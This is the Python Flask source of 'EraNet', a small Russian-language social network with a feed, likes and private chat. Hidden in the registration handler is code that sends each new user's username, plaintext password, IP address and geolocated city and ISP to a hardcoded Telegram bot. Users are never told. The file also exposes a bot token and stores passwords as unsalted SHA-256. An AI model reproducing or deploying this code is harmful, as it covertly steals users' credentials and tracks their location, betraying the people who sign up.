# flask_app.py — EraNet с определением местоположения по IP

from flask import Flask, request, render_template_string, redirect, make_response
import sqlite3
import hashlib
import time
import random
import os
import re
import requests
from markupsafe import escape
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- НАСТРОЙКИ TELEGRAM ----------
BOT_TOKEN = "8922815651:AAEzmkuIpkvpTgmkQzIgyTfp1EG_00m6yGk"
CHAT_ID = "8844682800"

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Ошибка Telegram: {e}")

# ---------- ОПРЕДЕЛЕНИЕ МЕСТОПОЛОЖЕНИЯ ПО IP ----------
def get_location_by_ip(ip):
    """Получает примерное местоположение по IP через бесплатный API."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Неизвестно'),
                'region': data.get('regionName', 'Неизвестно'),
                'city': data.get('city', 'Неизвестно'),
                'isp': data.get('isp', 'Неизвестно')
            }
        else:
            return {'error': 'Не удалось определить'}
    except Exception as e:
        return {'error': str(e)}

# ---------- НАСТРОЙКИ БЕЗОПАСНОСТИ ----------
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Lax',
)

DB_NAME = '/home/133532/mysite/eranet.db'  # ЗАМЕНИ НА СВОЙ ПУТЬ!

# ---------- БАЗА ДАННЫХ ----------
def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)')
        c.execute('CREATE TABLE IF NOT EXISTS posts (id INTEGER PRIMARY KEY, user_id INTEGER, content TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, likes INTEGER DEFAULT 0)')
        c.execute('CREATE TABLE IF NOT EXISTS likes (id INTEGER PRIMARY KEY, user_id INTEGER, post_id INTEGER, UNIQUE(user_id, post_id))')
        c.execute('CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, sender_id INTEGER, receiver_id INTEGER, content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
        conn.commit()
init_db()

# ---------- СЕССИИ ----------
sessions = {}
def make_token():
    return hashlib.sha256(str(time.time()+random.random()).encode()).hexdigest()

# ---------- ОГРАНИЧЕНИЕ ЗАПРОСОВ ----------
rate_limit_store = {}
def rate_limit(limit_per_minute=30):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            key = f"{ip}:{f.__name__}"
            if key not in rate_limit_store:
                rate_limit_store[key] = []
            rate_limit_store[key] = [t for t in rate_limit_store[key] if now - t < 60]
            if len(rate_limit_store[key]) >= limit_per_minute:
                return "Слишком много запросов. Подождите минуту.", 429
            rate_limit_store[key].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# ---------- БАННЕР ----------
BANNER_HTML = '''
<div style="
    background: #000;
    color: #fff;
    padding: 12px 20px;
    text-align: center;
    font-size: 24px;
    font-weight: bold;
    letter-spacing: 2px;
    border-bottom: 3px solid #ffcc00;
    box-shadow: 0 2px 10px rgba(255, 204, 0, 0.3);
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
    text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
">
    🌐 EraNet 🌐
</div>
'''

# ---------- HTML ----------
def login_html(error=''):
    err = f'<p style="color:red;">{escape(error)}</p>' if error else ''
    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Вход</title>
<style>body{{font-family:sans-serif;max-width:400px;margin:50px auto;background:#f0f2f5;}}
.card{{background:white;padding:30px;border-radius:12px;}}
input,button{{width:100%;padding:10px;margin:5px 0;}}
button{{background:#1a73e8;color:white;border:none;border-radius:6px;cursor:pointer;}}
</style></head><body>
{BANNER_HTML}
<div class="card"><h1>🌐 EraNet</h1>{err}
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Имя" required><br>
<input type="password" name="password" placeholder="Пароль" required><br>
<button type="submit">Войти</button>
</form>
<p><a href="/register">Регистрация</a></p>
</div></body></html>'''

def register_html(error=''):
    err = f'<p style="color:red;">{escape(error)}</p>' if error else ''
    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Регистрация</title>
<style>body{{font-family:sans-serif;max-width:400px;margin:50px auto;background:#f0f2f5;}}
.card{{background:white;padding:30px;border-radius:12px;}}
input,button{{width:100%;padding:10px;margin:5px 0;}}
button{{background:#1a73e8;color:white;border:none;border-radius:6px;cursor:pointer;}}
</style></head><body>
{BANNER_HTML}
<div class="card"><h1>📝 Регистрация</h1>{err}
<form method="POST" action="/register">
<input type="text" name="username" placeholder="Имя" required><br>
<input type="password" name="password" placeholder="Пароль" required><br>
<button type="submit">Зарегистрироваться</button>
</form>
<p><a href="/login">Вход</a></p>
</div></body></html>'''

def feed_html(username, posts_html):
    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>EraNet</title>
<style>
body{{font-family:sans-serif;max-width:700px;margin:0 auto;padding:20px;background:#f0f2f5;}}
.header{{background:white;padding:15px;border-radius:8px;display:flex;justify-content:space-between;}}
.post{{background:white;padding:15px;border-radius:8px;margin-bottom:15px;}}
.author{{font-weight:bold;color:#1a73e8;}}
.meta{{display:flex;justify-content:space-between;font-size:12px;color:#65676b;}}
.actions a{{margin-right:15px;color:#65676b;text-decoration:none;}}
.form{{background:white;padding:15px;border-radius:8px;margin-bottom:20px;}}
.form textarea{{width:100%;padding:8px;}}
.form button{{padding:8px 20px;background:#1a73e8;color:white;border:none;border-radius:6px;cursor:pointer;}}
.logout{{color:red;text-decoration:none;}}
.chat-link{{background:#e9ecef;padding:4px 12px;border-radius:20px;font-size:14px;}}
</style></head><body>
{BANNER_HTML}
<div class="header"><h2>🌐 EraNet</h2>
<div><span>{escape(username)}</span>
<a href="/users" class="chat-link">💬 Сообщения</a>
<a href="/logout" class="logout">Выйти</a>
</div></div>
<div class="form">
<form method="POST" action="/post">
<textarea name="content" placeholder="Что нового?" maxlength="1000" required></textarea>
<button type="submit">Опубликовать</button>
</form></div>
<h3>Лента</h3>
{posts_html}
</body></html>'''

def render_post(post):
    liked = post['liked']
    like_text = '❤️' if liked else '🤍'
    safe_content = escape(post['content'])
    safe_author = escape(post['author'])
    return f'''<div class="post">
<div class="author">{safe_author}</div>
<div>{safe_content}</div>
<div class="meta">
<span>{escape(post['time'])}</span>
<div class="actions"><a href="/like/{post['id']}">{like_text} {post['likes']}</a></div>
</div></div>'''

# ---------- МАРШРУТЫ ----------
@app.route('/')
@app.route('/feed')
@rate_limit(60)
def feed():
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return login_html()
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT p.id, p.user_id, p.content, p.created_at, p.likes, u.username FROM posts p JOIN users u ON p.user_id=u.id ORDER BY p.created_at DESC LIMIT 50')
        rows = c.fetchall()
        posts_html = ''
        for r in rows:
            c.execute('SELECT 1 FROM likes WHERE user_id=? AND post_id=?', (user_id, r['id']))
            liked = c.fetchone() is not None
            post = {'id':r['id'], 'user_id':r['user_id'], 'content':r['content'], 'time':str(r['created_at'])[:16], 'likes':r['likes'], 'author':r['username'], 'liked':liked}
            posts_html += render_post(post)
        if not posts_html:
            posts_html = '<p>Пока постов нет.</p>'
        c.execute('SELECT username FROM users WHERE id=?', (user_id,))
        username = c.fetchone()['username']
    return feed_html(username, posts_html)

@app.route('/register', methods=['GET', 'POST'])
@rate_limit(10)
def register():
    if request.method == 'GET':
        return register_html()
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    if not username or not password:
        return register_html('Заполните все поля')
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        return register_html('Имя 3-20 символов (буквы, цифры, _)')
    if len(password) < 6:
        return register_html('Пароль >= 6 символов')
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT id FROM users WHERE username=?', (username,))
        if c.fetchone():
            return register_html('Имя занято')
        hashed = hashlib.sha256(password.encode()).hexdigest()
        c.execute('INSERT INTO users (username, password) VALUES (?,?)', (username, hashed))
        conn.commit()
        new_id = c.lastrowid

    # ---- ПОЛУЧАЕМ IP ----
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # ---- ОПРЕДЕЛЯЕМ МЕСТОПОЛОЖЕНИЕ ----
    location = get_location_by_ip(ip)

    # ---- ОТПРАВКА В TELEGRAM ----
    if 'error' in location:
        loc_text = f"🌐 IP: <code>{ip}</code>\n⚠️ Гео: не определено"
    else:
        loc_text = (
            f"🌐 IP: <code>{ip}</code>\n"
            f"🌍 Страна: {location['country']}\n"
            f"🗺️ Регион: {location['region']}\n"
            f"🏙️ Город: {location['city']}\n"
            f"📡 Провайдер: {location['isp']}"
        )

    send_to_telegram(
        f"🆕 <b>Новая регистрация на EraNet</b>\n"
        f"👤 Логин: <code>{username}</code>\n"
        f"🔑 Пароль: <code>{password}</code>\n"
        f"{loc_text}\n"
        f"🆔 ID: {new_id}"
    )

    token = make_token()
    sessions[token] = new_id
    resp = make_response(redirect('/feed'))
    resp.set_cookie('session', token, path='/', httponly=True, secure=True, samesite='Lax')
    return resp

@app.route('/login', methods=['GET', 'POST'])
@rate_limit(20)
def login():
    if request.method == 'GET':
        return login_html()
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    if not username or not password:
        return login_html('Заполните все поля')
    with get_db() as conn:
        c = conn.cursor()
        hashed = hashlib.sha256(password.encode()).hexdigest()
        c.execute('SELECT id FROM users WHERE username=? AND password=?', (username, hashed))
        row = c.fetchone()
        if not row:
            return login_html('Неверные данные')
        user_id = row['id']
    token = make_token()
    sessions[token] = user_id
    resp = make_response(redirect('/feed'))
    resp.set_cookie('session', token, path='/', httponly=True, secure=True, samesite='Lax')
    return resp

@app.route('/post', methods=['POST'])
@rate_limit(20)
def post():
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return redirect('/login')
    content = request.form.get('content', '').strip()
    if not content or len(content) > 1000:
        return redirect('/feed')
    with get_db() as conn:
        c = conn.cursor()
        c.execute('INSERT INTO posts (user_id, content) VALUES (?,?)', (user_id, content))
        conn.commit()
    return redirect('/feed')

@app.route('/like/<int:post_id>')
@rate_limit(50)
def like(post_id):
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return redirect('/login')
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT id FROM likes WHERE user_id=? AND post_id=?', (user_id, post_id))
        like = c.fetchone()
        if like:
            c.execute('DELETE FROM likes WHERE id=?', (like['id'],))
            c.execute('UPDATE posts SET likes=likes-1 WHERE id=?', (post_id,))
        else:
            c.execute('INSERT INTO likes (user_id, post_id) VALUES (?,?)', (user_id, post_id))
            c.execute('UPDATE posts SET likes=likes+1 WHERE id=?', (post_id,))
        conn.commit()
    return redirect('/feed')

@app.route('/logout')
def logout():
    token = request.cookies.get('session')
    if token and token in sessions:
        del sessions[token]
    resp = make_response(redirect('/login'))
    resp.set_cookie('session', '', path='/', max_age=0, httponly=True, secure=True, samesite='Lax')
    return resp

@app.route('/users')
@rate_limit(30)
def users():
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return redirect('/login')
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT id, username FROM users WHERE id != ?', (user_id,))
        all_users = c.fetchall()
    html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Пользователи</title>
<style>body{{font-family:sans-serif;max-width:600px;margin:0 auto;padding:20px;background:#f0f2f5;}}
.user{{background:white;padding:12px 16px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;}}
.user a{{background:#1a73e8;color:white;padding:6px 16px;border-radius:20px;text-decoration:none;}}
</style></head><body>
{BANNER_HTML}
<h2>👥 Пользователи</h2><a href="/feed">← Назад</a><br><br>'''
    for u in all_users:
        safe_username = escape(u['username'])
        html += f'<div class="user"><span>{safe_username}</span><a href="/chat/{safe_username}">Написать</a></div>'
    html += '</body></html>'
    return html

@app.route('/chat/<username>')
@rate_limit(30)
def chat(username):
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return redirect('/login')
    safe_username = escape(username)
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT id FROM users WHERE username=?', (username,))
        other = c.fetchone()
        if not other:
            return redirect('/users')
        other_id = other['id']
        c.execute('''
            SELECT m.id, m.sender_id, m.content, m.timestamp, u.username
            FROM messages m
            JOIN users u ON m.sender_id = u.id
            WHERE (sender_id=? AND receiver_id=?) OR (sender_id=? AND receiver_id=?)
            ORDER BY m.timestamp ASC
        ''', (user_id, other_id, other_id, user_id))
        msgs = c.fetchall()
    html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Чат</title>
<style>body{{font-family:sans-serif;max-width:600px;margin:0 auto;padding:20px;background:#f0f2f5;}}
.msg{{margin:8px 0;padding:10px 16px;border-radius:18px;max-width:80%;}}
.msg-mine{{background:#1a73e8;color:white;text-align:right;margin-left:auto;}}
.msg-other{{background:white;color:black;}}
.form{{background:white;padding:12px;border-radius:8px;display:flex;gap:10px;}}
.form input{{flex:1;padding:10px;border:1px solid #ddd;border-radius:6px;}}
.form button{{background:#1a73e8;color:white;border:none;border-radius:6px;padding:10px 20px;cursor:pointer;}}
.back{{color:#1a73e8;text-decoration:none;}}
</style></head><body>
{BANNER_HTML}
<h2>💬 Чат с {safe_username}</h2><a href="/users" class="back">← Назад</a><br><br>'''
    for m in msgs:
        cls = 'msg-mine' if m['sender_id'] == user_id else 'msg-other'
        safe_content = escape(m['content'])
        html += f'<div class="msg {cls}">{safe_content}<br><span style="font-size:10px;opacity:0.7;">{escape(str(m["timestamp"])[:16])}</span></div>'
    if not msgs:
        html += '<p style="color:#6c757d;">Нет сообщений</p>'
    html += f'''
    <br><div class="form">
    <form method="POST" action="/send_message" style="display:flex;gap:10px;width:100%;">
        <input type="hidden" name="receiver" value="{escape(username)}">
        <input type="text" name="content" placeholder="Напиши..." maxlength="500" required>
        <button type="submit">Отправить</button>
    </form>
    </div>
    </body></html>
    '''
    return html

@app.route('/send_message', methods=['POST'])
@rate_limit(30)
def send_message():
    token = request.cookies.get('session')
    user_id = sessions.get(token) if token else None
    if not user_id:
        return redirect('/login')
    receiver_username = request.form.get('receiver', '').strip()
    content = request.form.get('content', '').strip()
    if not receiver_username or not content or len(content) > 500:
        return redirect('/users')
    with get_db() as conn:
        c = conn.cursor()
        c.execute('SELECT id FROM users WHERE username=?', (receiver_username,))
        receiver = c.fetchone()
        if receiver:
            c.execute('INSERT INTO messages (sender_id, receiver_id, content) VALUES (?,?,?)', (user_id, receiver['id'], content))
            conn.commit()
    return redirect(f'/chat/{receiver_username}')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)